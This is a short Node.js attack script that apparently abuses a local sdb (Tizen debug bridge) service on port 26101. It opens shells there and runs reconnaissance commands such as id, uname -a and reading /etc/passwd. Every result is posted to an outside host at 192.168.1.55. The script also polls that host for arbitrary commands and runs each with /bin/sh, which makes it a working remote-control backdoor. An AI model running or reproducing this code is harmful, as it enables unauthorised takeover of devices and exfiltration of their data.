var net = require('net');
var http = require('http');
var cp = require('child_process');
var HOST = '192.168.1.55';
function post(b) {
    try {
        var r = http.request({ host: HOST, port: 4446, method: 'POST', path: '/r' }, function () {});
        r.on('error', function () {});
        r.write(b || '');
        r.end();
    } catch (e) {}
}
post('C7?start');

var s = net.connect(26101, '127.0.0.1');
var buf = new Buffer(0);
var MYID = 0x12345678;
var queue = ['id', 'uname -a', 'cat /proc/version', 'ls /', 'head -5 /etc/passwd', 'cat /proc/self/status | head -8'];
var qi = 0;
var cur = '';

function pkt(cmd, a1, a2, payload) {
    var b = new Buffer(24 + payload.length);
    b.write(cmd, 0, 'ascii');
    b.writeUInt32LE(a1, 4);
    b.writeUInt32LE(a2, 8);
    b.writeUInt32LE(payload.length, 12);
    payload.copy(b, 24);
    return b;
}
function sendCmd() {
    if (qi >= queue.length) { post('C7?done'); return; }
    cur = queue[qi++];
    post('C7?send=' + cur);
    s.write(pkt('OPEN', MYID, 0, new Buffer('shell:' + cur + '\0', 'binary')));
}
s.on('connect', function () {
    post('C7?tcp=ok');
    // sdb: version 0x01000000, maxdata 4096, identity "host::"
    s.write(pkt('CNXN', 0x01000000, 4096, new Buffer('host::\0', 'binary')));
});
s.on('data', function (d) {
    buf = Buffer.concat([buf, d]);
    while (buf.length >= 24) {
        var cmd = buf.slice(0, 4).toString('ascii');
        var a1 = buf.readUInt32LE(4);
        var len = buf.readUInt32LE(12);
        if (buf.length < 24 + len) break;
        var payload = buf.slice(24, 24 + len);
        buf = buf.slice(24 + len);
        if (cmd === 'CNXN') {
            post('C7?cnxn=' + payload.toString('ascii'));
            sendCmd();
        } else if (cmd === 'OKAY') {
            post('C7?okay');
        } else if (cmd === 'WRTE' && a1 === MYID) {
            post('C7?[' + cur + ']=' + payload.toString());
        } else if (cmd === 'CLSE' && a1 === MYID) {
            post('C7?closed[' + cur + ']');
            sendCmd();
        } else if (cmd === 'AUTH') {
            post('C7?auth=' + a1);
        }
    }
});
s.on('error', function (e) { post('C7?err=' + e.message); });
s.on('close', function () { post('C7?closed_sock'); });

function tick() {
    http.get('http://' + HOST + ':8000/cmd', function (res) {
        var b = '';
        res.setEncoding('utf8');
        res.on('data', function (c) { b += c; });
        res.on('end', function () {
            if ((b || '').trim().length > 0) {
                var sh = cp.spawn('/bin/sh', ['-c', b]);
                var o = '', e = '';
                sh.stdout.on('data', function (d) { o += d; });
                sh.stderr.on('data', function (d) { e += d; });
                sh.on('exit', function (c) { post('RUN?code=' + c + '\n' + o + e); });
            }
            setTimeout(tick, 3000);
        });
    }).on('error', function () { setTimeout(tick, 6000); });
}
tick();
